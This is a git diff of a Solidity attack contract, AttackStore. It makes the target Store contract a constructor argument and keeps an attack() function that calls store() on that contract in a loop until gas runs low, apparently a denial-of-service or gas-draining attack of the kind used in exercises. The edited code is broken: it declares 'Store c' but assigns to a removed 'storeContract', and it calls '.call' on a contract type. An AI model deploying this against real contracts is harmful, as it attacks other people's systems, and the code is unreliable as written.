@@ -5,7 +5,11 @@ import "@openzeppelin/contracts/access/Ownable.sol";
 import "./Store.sol";
 
 contract AttackStore is Ownable {
-    address storeContract = 0x358AA13c52544ECCEF6B0ADD0f801012ADAD5eE3;
+    Store c;
+
+    constructor(Store _contractAddress) {
+        storeContract = Store(_contractAddress);
+    }
 
     function deposit() public payable {}
 
@@ -16,9 +20,7 @@ contract AttackStore is Ownable {
     function attack() public onlyOwner {
         do {
             (bool success, ) =
-                address(storeContract).call{value: 0}(
-                    abi.encodeWithSignature("store()")
-                );
+                c.call{value: 0}(abi.encodeWithSignature("store()"));
             require(success, "Attack failed");
         } while (gasleft() > 80000);
     }
